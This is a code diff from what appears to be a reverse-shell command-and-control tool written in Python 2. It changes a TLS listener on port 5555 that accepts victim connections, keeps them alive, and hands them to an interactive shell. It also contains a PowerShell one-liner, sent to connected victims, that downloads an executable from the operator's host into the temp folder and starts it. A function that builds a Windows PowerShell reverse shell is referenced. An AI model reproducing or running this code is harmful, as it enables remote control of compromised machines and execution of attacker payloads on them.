@@ -12,37 +12,40 @@ from menu import *
 
 
 def startListener():
+    time.sleep(0.25)
     try:
-        time.sleep(0.25)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ws = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, certfile="server.crt", keyfile="server.key", server_side=True)
+    except:
+        print t.bold_red + "[*] Error with listener - Rerun ./setup.py to generate certs" + t.normal
+        sys.exit(1)
+    try:
         ws.bind((FUNCTIONS().CheckInternet(), 5555))
         ws.listen(10)
-        print t.bold_red + "listening on port 5555" + t.normal
+    except:
+        print t.bold_red + "[*] Error with listener - Port in use" + t.normal
+        sys.exit(1)
 
-        startWorker = True
-        clientnumber = 0
+    print t.bold_red + "listening on port 5555" + t.normal
+    clientnumber = 0
 
-        while True:
-            clientconn, address = ws.accept()
-            ip , port = address
-            if clientconn:
-                clientnumber += 1
-                print t.bold_green + "connection from %s %s"%(ip,port) + t.normal
-                if startWorker:
-                        worker = Thread(target=pingClients, args=(clientconn,clientnumber))
-                        worker.setDaemon(True)
-                        worker.start()
-                        startWorker = False
+    while True:
+        clientconn, address = ws.accept()
+        ip , port = address
+        if clientconn:
+            clientnumber += 1
+            print t.bold_green + "connection from %s %s"%(ip,port) + t.normal
 
-            from menu import clientMenuOptions
-            clientMenuOptions[str(clientnumber)] =  {'payloadchoice': None, 'payload':ip + ":" + str(port), 'extrawork': interactShell, 'params': (clientconn,clientnumber)}
-        ws.close()
-    except IOError:
-        print t.bold_red + "[*] Rerun ./setup.py to generate certs" + t.normal
-    except Exception as E:
-        print t.bold_red + "[*] Error With Listener" + t.normal
-        print E
+            worker = Thread(target=pingClients, args=(clientconn,clientnumber))
+            worker.setDaemon(True)
+            worker.start()
+
+        from menu import clientMenuOptions
+        clientMenuOptions[str(clientnumber)] =  {'payloadchoice': None, 'payload':ip + ":" + str(port), 'extrawork': interactShell, 'params': (clientconn,clientnumber)}
+    ws.close()
+
+
+
 
 def interactShell(clientconn,clientnumber):
     from menu import clientMenuOptions
@@ -79,7 +82,7 @@ def clientUpload(fileToUpload,clientconn,powershellExec):
         print t.bold_green + "[*] Starting Transfer" + t.normal
         ipaddr = FUNCTIONS().CheckInternet()
         FUNCTIONS().DoServe(ipaddr,fileToUpload,os.path.dirname(fileToUpload))
-        clientconn.sendall("$a = New-Object System.Net.WebClient;$a.DownloadFile(\"http://" + ipaddr + ':8000/' + fileToUpload.split('/')[-1] + "\",\"$Env:TEMP\\temp.exe\");Start-Sleep -s 15;Start-Process \"$Env:TEMP\\temp.exe\"")
+        clientconn.sendall("$a = New-Object System.Net.WebClient;$a.DownloadFile(\"http://" + ipaddr + ':8000/' + fileToUpload.split('/')[-1] + "\",\"$Env:TEMP\\temp.exe\");Start-Sleep -s 25;Start-Process \"$Env:TEMP\\temp.exe\"")
 
 def printListener():
     windows_ps_rev_shell = (
@@ -102,9 +105,9 @@ def pingClients(clientconn,clientnumber):
     from menu import clientMenuOptions
     try:
         while True:
-            time.sleep(30)
-            clientconn.sendall("pwd")
-            pingdata = clientconn.recv(200).encode("utf-8").replace('\n','')
+            time.sleep(15)
+            clientconn.recv(1)
     except:
         print t.bold_red + "Client %s Has Disconnected" % clientnumber + t.normal
         del clientMenuOptions[str(clientnumber)]
+        sys.exit(1)
